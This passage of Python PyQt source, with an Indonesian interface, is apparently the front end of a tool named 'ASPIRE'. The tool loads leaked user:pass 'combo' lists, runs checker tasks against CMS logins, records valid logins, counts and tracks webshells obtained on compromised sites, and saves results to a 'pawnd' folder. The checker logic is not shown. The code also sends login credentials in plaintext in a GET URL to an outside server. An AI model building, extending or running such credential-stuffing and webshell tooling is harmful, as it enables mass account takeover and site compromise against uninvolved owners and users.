        self.results_table.setHorizontalHeaderLabels(['User:Pass', 'Domain', 'URL Lengkap', 'Tipe CMS'])
        self.results_table.setEditTriggers(QTableWidget.NoEditTriggers); self.results_table.setShowGrid(False); self.results_table.verticalHeader().setVisible(False)
        header = self.results_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.Stretch); header.setSectionResizeMode(1, QHeaderView.Stretch)
        header.setSectionResizeMode(2, QHeaderView.Stretch); header.setSectionResizeMode(3, QHeaderView.ResizeToContents)
        layout.addWidget(self.results_table, 1)
        return page

    def create_worker_page(self):
        page = QWidget(); layout = QVBoxLayout(page); layout.setContentsMargins(0,0,0,0); layout.setSpacing(15)
        controls_bar = QWidget(); controls_layout = QHBoxLayout(controls_bar); controls_layout.setContentsMargins(0,0,0,0)
        self.load_combo_button = self.create_action_button("Muat Combo", ICONS["load"], "LoadButton", self.load_combo)
        self.start_button = self.create_action_button("Mulai Tugas Baru", ICONS["start"], "StartButton", self.start_new_task)
        self.stop_button = self.create_action_button("Hentikan Tugas", ICONS["stop"], "StopButton", self.stop_selected_task)
        controls_layout.addWidget(self.load_combo_button); controls_layout.addWidget(self.start_button)
        controls_layout.addWidget(self.stop_button); controls_layout.addStretch(1)
        settings_group = QWidget(); settings_group.setObjectName("WorkerSettingsGroup"); settings_layout = QHBoxLayout(settings_group); settings_layout.setContentsMargins(0,0,0,0)
        self.timeout_input = QLineEdit("15"); self.timeout_input.setPlaceholderText('Timeout (d)'); self.timeout_input.setFixedWidth(100)
        self.remove_duplicate_checkbox = QCheckBox('Hapus Duplikat')
        self.active_checker_checkbox = QCheckBox('Checker Aktif'); self.active_checker_checkbox.setChecked(True)
        settings_layout.addWidget(self.timeout_input); settings_layout.addWidget(self.remove_duplicate_checkbox); settings_layout.addWidget(self.active_checker_checkbox)
        controls_layout.addWidget(settings_group); layout.addWidget(controls_bar)
        self.worker_table = QTableWidget(); self.worker_table.setColumnCount(7)
        self.worker_table.setHorizontalHeaderLabels(['ID Tugas', 'Status', 'File Sumber', 'Progres', 'Valid', 'Gagal', 'Shell'])
        self.worker_table.setEditTriggers(QTableWidget.NoEditTriggers); self.worker_table.setSelectionBehavior(QTableWidget.SelectRows); self.worker_table.setSelectionMode(QTableWidget.SingleSelection)
        header = self.worker_table.horizontalHeader()
        header.setSectionResizeMode(2, QHeaderView.Stretch); header.setSectionResizeMode(3, QHeaderView.Stretch)
        layout.addWidget(self.worker_table, 1)
        return page

    def create_action_button(self, text, icon_svg, object_name, on_click):
        button = QToolButton(); button.setText(" " + text); button.setIcon(self.create_icon(icon_svg))
        button.setIconSize(QSize(16,16)); button.setToolButtonStyle(Qt.ToolButtonTextBesideIcon)
        button.setProperty("class", "ActionButton"); button.setObjectName(object_name); button.clicked.connect(on_click)
        return button

    def create_webshell_page(self):
        page = QWidget(); layout = QVBoxLayout(page); layout.setContentsMargins(0,0,0,0)
        self.webshell_table = QTableWidget(); self.webshell_table.setColumnCount(3)
        self.webshell_table.setHorizontalHeaderLabels(['URL', 'Status', 'Terakhir Diperiksa'])
        self.webshell_table.setEditTriggers(QTableWidget.NoEditTriggers); self.webshell_table.setShowGrid(False); self.webshell_table.verticalHeader().setVisible(False)
        header = self.webshell_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.Stretch); header.setSectionResizeMode(1, QHeaderView.ResizeToContents); header.setSectionResizeMode(2, QHeaderView.ResizeToContents)
        layout.addWidget(self.webshell_table)
        return page

    def on_task_finished(self, task_id, status_message):
        color = QColor("#2ecc71") if status_message == "Selesai" else QColor("#e74c3c")
        for row in range(self.worker_table.rowCount()):
            if self.worker_table.item(row, 0).text() == task_id:
                status_item = QTableWidgetItem(status_message); status_item.setForeground(QBrush(color))
                self.worker_table.setItem(row, 1, status_item); break
        if task_id in self.active_workers: del self.active_workers[task_id]

    def start_new_task(self):
        if not self.combo_files: self.show_notification("warning", "Tidak Ada File", "Silakan muat file combo terlebih dahulu."); return
        extract_worker = ExtractWorker(self.signals, self.combo_files); self.temp_extract_worker = extract_worker
        extract_worker.finished.connect(lambda: self.on_extraction_finished(extract_worker.extracted_lines)); extract_worker.start()

    def on_extraction_finished(self, extracted_lines):
        if not extracted_lines: self.show_notification("warning", "Tidak Ada Data", "Tidak ada data yang dapat diproses dari file."); return
        lines_to_check = list(dict.fromkeys(extracted_lines)) if self.remove_duplicate_checkbox.isChecked() else extracted_lines
        self.task_counter += 1; task_id = f"Tugas-{self.task_counter}"
        active_checker = self.active_checker_checkbox.isChecked(); timeout = int(self.timeout_input.text()) if self.timeout_input.text().isdigit() else 15
        checker = CheckerWorker(task_id, active_checker, timeout, self.signals, lines_to_check)
        self.active_workers[task_id] = checker
        self.task_stats_cache[task_id] = {'checked': 0, 'valid': 0, 'invalid': 0, 'shells': 0}
        row_pos = self.worker_table.rowCount(); self.worker_table.insertRow(row_pos)
        self.worker_table.setItem(row_pos, 0, QTableWidgetItem(task_id))
        status_item = QTableWidgetItem("Berjalan"); status_item.setForeground(QBrush(QColor("#f39c12"))); self.worker_table.setItem(row_pos, 1, status_item)
        self.worker_table.setItem(row_pos, 2, QTableWidgetItem(", ".join([os.path.basename(f) for f in self.combo_files])))
        self.worker_table.setItem(row_pos, 3, QTableWidgetItem(f"0 / {len(lines_to_check)}"))
        for i in range(4, 7): self.worker_table.setItem(row_pos, i, QTableWidgetItem("0"))
        checker.start(); self.show_notification("info", "Tugas Dimulai", f"{task_id} dimulai dengan {len(lines_to_check)} item.")
        self.combo_files = []; self.load_combo_button.setText(" Muat Combo")

    def stop_selected_task(self):
        selected_rows = self.worker_table.selectionModel().selectedRows()
        if not selected_rows: self.show_notification("info", "Tidak Ada Pilihan", "Pilih tugas untuk dihentikan."); return
        task_id = self.worker_table.item(selected_rows[0].row(), 0).text()
        worker = self.active_workers.get(task_id)
        if worker and worker.isRunning(): worker.stop(); self.show_notification("info", "Tugas Dihentikan", f"{task_id} sedang dihentikan.")
        else: self.show_notification("warning", "Tugas Tidak Berjalan", f"{task_id} sudah selesai atau dihentikan.")

    def update_stats(self, task_id, total_lines, checked, valid, invalid, shells):
        with self.stats_lock:
            for row in range(self.worker_table.rowCount()):
                if self.worker_table.item(row, 0) and self.worker_table.item(row, 0).text() == task_id:
                    self.worker_table.item(row, 3).setText(f"{checked} / {total_lines}")
                    self.worker_table.item(row, 4).setText(str(valid))
                    self.worker_table.item(row, 5).setText(str(invalid))
                    self.worker_table.item(row, 6).setText(str(shells))
                    break

            old_stats = self.task_stats_cache.get(task_id, {})
            self.global_checked += checked - old_stats.get('checked', 0)
            self.global_valid += valid - old_stats.get('valid', 0)
            self.global_invalid += invalid - old_stats.get('invalid', 0)
            self.global_shells += shells - old_stats.get('shells', 0)

            self.task_stats_cache[task_id] = {'checked': checked, 'valid': valid, 'invalid': invalid, 'shells': shells}

            self.stats_checked_label.setText(f'{self.global_checked}')
            self.stats_valid_label.setText(f'{self.global_valid}')
            self.stats_invalid_label.setText(f'{self.global_invalid}')
            self.stats_shell_label.setText(f'{self.global_shells}')

    def create_icon(self, svg_data):
        pixmap = QPixmap()
        pixmap.loadFromData(QByteArray(svg_data.encode()))
        return QIcon(pixmap)

    def show_notification(self, type, title, message):
        icons = {"success": ICONS["success_check"], "info": ICONS["info"], "warning": ICONS["warning"]}
        notif = NotificationWidget(icons.get(type, ICONS["info"]), title, message, self)
        notif.destroyed.connect(self._on_notification_closed)
        self.notifications.append(notif)
        self._reposition_notifications()
        notif.show()

    def _reposition_notifications(self):
        p_rect = self.geometry()
        margin = 15
        y = p_rect.height() - margin
        for notif in reversed(self.notifications):
            try:
                y -= notif.height() + 10
                x = p_rect.width() - notif.width() - margin
                notif.move(p_rect.x() + x, p_rect.y() + y)
            except RuntimeError:
                continue

    def _on_notification_closed(self, obj):
        try:
            self.notifications.remove(obj)
            self._reposition_notifications()
        except ValueError:
            pass

    def add_new_shell_to_gui(self, shell_url):
        if shell_url not in self.active_shells:
            self.active_shells.append(shell_url)
            self.update_webshell_table()

    def update_webshell_table(self):
        self.webshell_table.setRowCount(0)
        for i, url in enumerate(self.active_shells):
            self.webshell_table.insertRow(i)
            self.webshell_table.setItem(i, 0, QTableWidgetItem(url))
            status_item = QTableWidgetItem('Menunggu...')
            status_item.setForeground(QColor("#b0bec5"))
            self.webshell_table.setItem(i, 1, status_item)
            self.webshell_table.setItem(i, 2, QTableWidgetItem("-"))
            self.shell_checker.add_task(i, url)

    def toggle_maximize_restore(self):
        if self.isMaximized():
            self.showNormal()
        else:
            self.showMaximized()

    def update_shell_status(self, row, status, color):
        if 0 <= row < self.webshell_table.rowCount():
            self.webshell_table.item(row, 1).setText(status)
            self.webshell_table.item(row, 1).setForeground(color)
            self.webshell_table.item(row, 2).setText(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))

    def load_combo(self):
        files, _ = QFileDialog.getOpenFileNames(self, 'Buka File Combo', '', 'File Teks (*.txt);;Semua File (*)')
        if files:
            self.combo_files = files
            self.load_combo_button.setText(f" {len(files)} file dimuat")
            self.show_notification("success", "File Berhasil Dimuat", f"{len(files)} file combo siap.")

    def update_results_table(self, user_pass, domain, full_url, cms_type):
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)
        self.results_table.setItem(row, 0, QTableWidgetItem(user_pass))
        self.results_table.setItem(row, 1, QTableWidgetItem(domain))
        self.results_table.setItem(row, 2, QTableWidgetItem(full_url))
        self.results_table.setItem(row, 3, QTableWidgetItem(cms_type))

    def closeEvent(self, event):
        reply = QMessageBox.question(self, 'Konfirmasi Keluar',
                                     "Anda yakin ingin keluar? Semua tugas yang sedang berjalan akan dihentikan.",
                                     QMessageBox.Yes | QMessageBox.No, QMessageBox.No)

        if reply == QMessageBox.Yes:
            logging.info("Aplikasi sedang ditutup. Menghentikan semua thread...")
            self.shell_checker.stop()
            for worker in self.active_workers.values():
                if worker.isRunning():
                    worker.stop()
                    worker.wait(5000) 
            event.accept()
        else:
            event.ignore()

    def changeEvent(self, event):
        if event.type() == QEvent.WindowStateChange:
            self._reposition_notifications()
            icon = ICONS["restore"] if self.isMaximized() else ICONS["maximize"]
            self.max_button.setIcon(self.create_icon(icon))
        super().changeEvent(event)

    def moveEvent(self, event):
        super().moveEvent(event)
        self._reposition_notifications()

    def resizeEvent(self, event):
        super().resizeEvent(event)
        self._reposition_notifications()

    def eventFilter(self, obj, event):
        if obj == self.header_bar:
            if event.type() == QEvent.MouseButtonPress and event.button() == Qt.LeftButton:
                if self.isMaximized(): return True
                self.dragging = True
                self.offset = event.globalPos() - self.pos()
                return True
            elif event.type() == QEvent.MouseMove and self.dragging:
                self.move(event.globalPos() - self.offset)
                return True
            elif event.type() == QEvent.MouseButtonRelease and event.button() == Qt.LeftButton:
                self.dragging = False
                return True
        return super().eventFilter(obj, event)

class LoginWindow(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Login"); self.setFixedSize(380, 420)
        self.setStyleSheet("""
            QDialog { background-color: #202123; font-family: "Roboto", "Segoe UI", sans-serif; }
            QLabel { color: #e0e0e0; }
            QLineEdit {
                background-color: #2a2d35;
                border: 1px solid #40414f;
                border-radius: 8px;
                padding: 10px;
                color: #e0e0e0;
                font-size: 14px;
            }
            QLineEdit:focus { border: 1px solid #4F5368; }
            QPushButton {
                background-color: #40414f;
                color: white;
                border: none;
                border-radius: 8px;
                font-weight: 600;
                padding: 12px;
                font-size: 15px;
            }
            QPushButton:hover { background-color: #4F5368; }
            #ErrorLabel { color: #ff5252; font-size: 13px; }
        """)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.Dialog)
        layout = QVBoxLayout(self); layout.setContentsMargins(30,30,30,30); layout.setSpacing(15)
        title_label = QLabel("ASPIRE Login"); title_label.setStyleSheet("font-size: 24px; font-weight: 600; color: #ffffff;")
        layout.addWidget(title_label, 0, Qt.AlignCenter); layout.addSpacing(20)
        self.username_input = QLineEdit(); self.username_input.setPlaceholderText("Nama Pengguna")
        self.password_input = QLineEdit(); self.password_input.setPlaceholderText("Kata Sandi"); self.password_input.setEchoMode(QLineEdit.Password)
        self.error_label = QLabel(""); self.error_label.setObjectName("ErrorLabel"); self.error_label.setAlignment(Qt.AlignCenter)
        self.login_button = QPushButton("Login"); self.login_button.clicked.connect(self.authenticate)
        layout.addWidget(self.username_input); layout.addWidget(self.password_input); layout.addWidget(self.error_label)
        layout.addSpacing(10); layout.addWidget(self.login_button)
        self.dragging = False; self.offset = QPoint()

    def authenticate(self):
        username = self.username_input.text(); password = self.password_input.text()
        if not username or not password: self.error_label.setText("Nama pengguna dan kata sandi harus diisi."); return
        self.login_button.setEnabled(False); self.login_button.setText("Mencoba Login...")
        try:
            api_url = f"http://devnusantara.my.id/api/auth.php?username={username}&password={password}"
            response = requests.get(api_url, timeout=10)
            response.raise_for_status() 
            data = response.json()

            if data.get("status") == "success":
                self.accept()
            else:
                self.error_label.setText(data.get("message", "Nama pengguna atau kata sandi salah."))

        except (requests.exceptions.RequestException, json.JSONDecodeError) as e:
            logging.error(f"Failed to connect or process response from auth server: {e}")
            self.error_label.setText("Gagal terhubung ke server otentikasi.")
        finally:
            self.login_button.setEnabled(True)
            self.login_button.setText("Login")

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton: self.dragging = True; self.offset = event.globalPos() - self.pos()
    def mouseMoveEvent(self, event):
        if self.dragging: self.move(event.globalPos() - self.offset)
    def mouseReleaseEvent(self, event): self.dragging = False

def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    login = LoginWindow()
    if login.exec_() == QDialog.Accepted:
        window = MainWindow()
        window.show()
        sys.exit(app.exec_())
    else:
        sys.exit(0)

if __name__ == '__main__':
    os.makedirs('results', exist_ok=True)
    os.makedirs('pawnd', exist_ok=True)
    main()
